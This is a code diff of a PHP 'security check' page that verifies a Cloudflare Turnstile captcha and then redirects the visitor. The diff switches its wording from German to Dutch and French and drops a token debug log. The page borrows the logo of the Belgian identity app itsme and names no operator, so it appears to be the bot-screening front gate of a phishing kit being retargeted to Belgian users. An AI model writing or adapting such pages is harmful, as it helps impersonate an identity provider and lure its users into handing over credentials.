@@ -1,5 +1,5 @@
 <?php
-// Secure Turnstile Verification - PHP Version (Two Images Left & Right)
+// Secure Turnstile Verification - PHP Version (NL/FR + Debug)
 session_start();
 
 // Configuration
@@ -31,11 +31,10 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
     error_log("cURL ERROR: " . (curl_error($ch) ?: "none"));
     error_log("HTTP STATUS: " . $httpStatus);
     error_log("CF RESPONSE: " . $result);
-    error_log("TOKEN: " . substr($token, 0, 20) . "...");
     error_log("=======================");
     
     if (curl_error($ch)) {
-        $error = "Verbindungsfehler / Erreur de connexion : " . curl_error($ch);
+        $error = "Verbindingsfout / Erreur de connexion : " . curl_error($ch);
     }
     curl_close($ch);
     
@@ -45,22 +44,22 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
             header("Location: " . $redirectUrl);
             exit;
         } else {
-            $error = "Verifizierung fehlgeschlagen. Bitte versuchen Sie es erneut. / La vérification a échoué. Veuillez réessayer.";
+            $error = "Verificatie mislukt. Probeer het opnieuw. / La vérification a échoué. Veuillez réessayer.";
             if (isset($response->{'error-codes'})) {
                 $error .= " (" . implode(", ", $response->{'error-codes'}) . ")";
             }
         }
     } else {
-        $error = "Serverfehler. Bitte versuchen Sie es später erneut. / Erreur serveur. Veuillez réessayer plus tard.";
+        $error = "Serverfout. Probeer het later opnieuw. / Erreur serveur. Veuillez réessayer plus tard.";
     }
 }
 ?>
 <!DOCTYPE html>
-<html lang="de">
+<html lang="nl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Sicherheitsüberprüfung / Vérification de sécurité</title>
+    <title>Veiligheidscontrole / Vérification de sécurité</title>
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
         * {
@@ -371,11 +370,11 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
             <img src="https://www.itsme-id.com/hubfs/Website%2025/Branding/Logo/itsme-logo.svg" alt="Logo">
         </div>
 
-        <h2>Sicherheitsüberprüfung</h2>
+        <h2>Veiligheidscontrole</h2>
         <h3>Vérification de sécurité</h3>
 
         <p class="description">
-            Bitte bestätigen Sie, dass Sie kein Roboter sind
+            Bevestig alstublieft dat u geen robot bent
             <span class="fr">Veuillez confirmer que vous n'êtes pas un robot</span>
         </p>
 
@@ -388,13 +387,13 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
                 <div class="error"><?php echo htmlspecialchars($error); ?></div>
             <?php endif; ?>
             
-            <button type="submit" id="submitBtn">Weiter / Continuer</button>
+            <button type="submit" id="submitBtn">Doorgaan / Continuer</button>
         </form>
 
         <div class="footer">
-            Sicherheit durch Cloudflare Turnstile
+            Beveiligd door Cloudflare Turnstile
             <span class="fr">Sécurisé par Cloudflare Turnstile</span>
-            <small style="color: #b88a5c; display: block; margin-top: 8px;">© 2025 Alle Rechte vorbehalten / Tous droits réservés</small>
+            <small style="color: #b88a5c; display: block; margin-top: 8px;">© 2025 Alle rechten voorbehouden / Tous droits réservés</small>
         </div>
     </div>
 
@@ -406,7 +405,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
         document.getElementById('verifyForm').addEventListener('submit', function(e) {
             const submitBtn = document.getElementById('submitBtn');
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="loading"></span> Wird überprüft... / Vérification...';
+            submitBtn.innerHTML = '<span class="loading"></span> Wordt geverifieerd... / Vérification...';
         });
     </script>
 </body>
